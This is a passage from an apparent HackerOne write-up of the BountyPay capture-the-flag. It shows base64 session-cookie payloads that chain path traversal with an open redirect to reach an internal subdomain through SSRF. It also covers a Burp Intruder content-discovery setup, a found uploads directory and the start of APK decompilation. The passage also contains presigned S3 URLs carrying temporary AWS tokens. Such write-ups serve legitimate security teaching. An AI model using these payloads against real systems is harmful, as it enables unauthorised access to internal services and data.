\u003ccode\u003e#\u003c/code\u003e after the value: \u003ccode\u003e{\u0026quot;account_id\u0026quot;:\u0026quot;F8gHiqSdpK#\u0026quot;,\u0026quot;hash\u0026quot;:\u0026quot;de235bffd23df6995ad4e0930baac1a2\u0026quot;}\u003c/code\u003e (base64-encode it and use it as the cookie):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/statements?month=05\u0026amp;year=2020\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapp.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etoken=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyMiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e \u003cspan class=\"m\"\u003e200\u003c/span\u003e \u003cspan class=\"ne\"\u003eOK\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/json\u003c/span\u003e\n\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;url\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;https:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eapi.bountypay.h1ctf.com\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eapi\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eaccounts\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eF8gHiqSdpK#\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003estatements?month=05\u0026amp;year=2020\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;data\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;{\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eaccount_id\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eF8gHiqSdpK\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e,\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eowner\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eMr Brian Oliver\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e,\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ecompany\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eBountyPay Demo \u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e}\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWe even found another endpoint and got some data back for Brian, but it doesn\u0026#39;t seem to be particularly useful. Recall now that we have a \u003ccode\u003esoftware\u003c/code\u003e subdomain which looked like an obvious target for SSRF. But we can only do Path Traversal so far. This is where we clearly need to chain Path Traversal with a redirect to access \u003ccode\u003esoftware\u003c/code\u003e subdomain. Our payload (decoded session cookie) thus becomes: \u003ccode\u003e{\u0026quot;account_id\u0026quot;:\u0026quot;../../redirect?url=https://software.bountypay.h1ctf.com/#\u0026quot;,\u0026quot;hash\u0026quot;:\u0026quot;de235bffd23df6995ad4e0930baac1a2\u0026quot;}\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/statements?month=05\u0026amp;year=2020\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapp.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etoken=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS8jIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0=\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis presents us with a login panel. Extracting HTML from JSON response and prettifying it gives us:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;html\u003c/span\u003e \u003cspan class=\"na\"\u003elang=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;en\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;head\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;meta\u003c/span\u003e \u003cspan class=\"na\"\u003echarset=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;utf-8\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;meta\u003c/span\u003e \u003cspan class=\"na\"\u003ehttp-equiv=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;X-UA-Compatible\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003econtent=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;IE=edge\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;meta\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;viewport\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003econtent=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;width=device-width, initial-scale=1\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;title\u0026gt;\u003c/span\u003eSoftware Storage\u003cspan class=\"nt\"\u003e\u0026lt;/title\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;link\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/css/bootstrap.min.css\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003erel=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;stylesheet\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/head\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;container\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;row\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;col-sm-6 col-sm-offset-3\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;h1\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text-align: center\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eSoftware Storage\u003cspan class=\"nt\"\u003e\u0026lt;/h1\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;post\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;panel panel-default\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;margin-top:50px\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                    \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;panel-heading\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eLogin\u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n                    \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;panel-body\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;margin-top:7px\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;label\u0026gt;\u003c/span\u003eUsername:\u003cspan class=\"nt\"\u003e\u0026lt;/label\u0026gt;\u0026lt;/div\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;div\u0026gt;\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;form-control\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/div\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;margin-top:7px\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;label\u0026gt;\u003c/span\u003ePassword:\u003cspan class=\"nt\"\u003e\u0026lt;/label\u0026gt;\u0026lt;/div\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;div\u0026gt;\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;form-control\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/div\u0026gt;\u003c/span\u003e\n                    \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;btn btn-success pull-right\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Login\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/js/jquery.min.js\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/js/bootstrap.min.js\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThere isn\u0026#39;t much we can do with it since SSRF only allows us to do \u003ccode\u003eGET\u003c/code\u003e requests and not \u003ccode\u003ePOST\u003c/code\u003e. What else? As usual, content discovery.  This one is a little bit more tricky to setup since the payload is base64-encoded, but it can still be easily done in Burp. We need to set the whole session cookie value as the target,  and add 3 \u003ccode\u003ePayload Processing\u003c/code\u003e rules:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\u0026quot;Add prefix\u0026quot; with value \u003ccode\u003e{\u0026quot;account_id\u0026quot;:\u0026quot;../../redirect?url=https://software.bountypay.h1ctf.com/\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003e\u0026quot;Add suffix\u0026quot; with value \u003ccode\u003e#\u0026quot;,\u0026quot;hash\u0026quot;:\u0026quot;de235bffd23df6995ad4e0930baac1a2\u0026quot;}\u003c/code\u003e      (the part between them will be our actual payload for content discovery)\u003c/li\u003e\n\u003cli\u003e \u0026quot;Encode\u0026quot; -\u0026gt; \u0026quot;Base64-encode\u0026quot;\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"ssrf-content-discovery-intruder-payload-processing-tasks.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gFTiEULu756rSB5bX1TbsDMt?response-content-disposition=attachment%3B%20filename%3D%22ssrf-content-discovery-intruder-payload-processing-tasks.png%22%3B%20filename%2A%3DUTF-8%27%27ssrf-content-discovery-intruder-payload-processing-tasks.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=dcaa9b306e46ced6eaf91b6d1231ec644f9cb7fc58c201cf66947b8a4f7b0789\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gFTiEULu756rSB5bX1TbsDMt?response-content-disposition=attachment%3B%20filename%3D%22ssrf-content-discovery-intruder-payload-processing-tasks.png%22%3B%20filename%2A%3DUTF-8%27%27ssrf-content-discovery-intruder-payload-processing-tasks.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=dcaa9b306e46ced6eaf91b6d1231ec644f9cb7fc58c201cf66947b8a4f7b0789\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eI\u0026#39;ve used a fairly simple wordlist and got a hit pretty quickly - there is an \u003ccode\u003e/uploads\u003c/code\u003e endpoint with Directory Listing enabled. In hindsight, that could have been guessed pretty easily even without bruteforcing.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/statements?month=05\u0026amp;year=2020\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapp.bountypay.h1ctf.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etoken=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS91cGxvYWRzLyMiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHTML code extracted from JSON response is:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;\u003c/span\u003eIndex of /uploads/\u003cspan class=\"nt\"\u003e\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u003c/span\u003e \u003cspan class=\"na\"\u003ebgcolor=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;white\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;h1\u0026gt;\u003c/span\u003eIndex of /uploads/\u003cspan class=\"nt\"\u003e\u0026lt;/h1\u0026gt;\u0026lt;hr\u0026gt;\u0026lt;pre\u0026gt;\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;../\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e../\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/uploads/BountyPay.apk\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eBountyPay.apk\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u003c/span\u003e                                        20-Apr-2020 11:26              4043701\n\u003cspan class=\"nt\"\u003e\u0026lt;/pre\u0026gt;\u0026lt;hr\u0026gt;\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNot sure why, but I then tried to access APK via SSRF. It didn\u0026#39;t work - which is consistent with the behaviour I observed for this SSRF where responses with certain content-types  were not forwarded back to us. I then tried to access the APK \u003ca href=\"/redirect?url=http%3A%2F%2Fsoftware.bountypay.h1ctf.com%2Fuploads%2FBountyPay.apk\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003edirectly\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, and sure enough it worked.\u003c/p\u003e\n\n\u003ch2 id=\"android\"\u003eAndroid\u003c/h2\u003e\n\n\u003cp\u003eWhile one could start by grepping strings from an APK, I usually go straight to decompiling the Java code. For this I use \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fpxb1988%2Fdex2jar\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003edex2jar\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e  with a command like:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e./d2j-dex2jar.sh \u003cspan class=\"nt\"\u003e-f\u003c/span\u003e \u003cspan class=\"nt\"\u003e-o\u003c/span\u003e ./../h1-ctf/jar/BountyPay.jar ./../h1-ctf/BountyPay.apk\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt produces a JAR file which you can then open in \u003ca href=\"/redirect?url=http%3A%2F%2Fjava-decompiler.github.io%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eJD-GUI\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. While you can browse the source code directly in JD-GUI, I much prefer JetBrains IDEs. You can export all decompiled code via \u0026quot;Save all sources\u0026quot; menu option, unzip the archive and use in in e.g. \u003ca href=\"/redirect?url=https%3A%2F%2Fwww.jetbrains.com%2Fidea%2F\" target=\"_blank\" rel=\"nofollow noopener 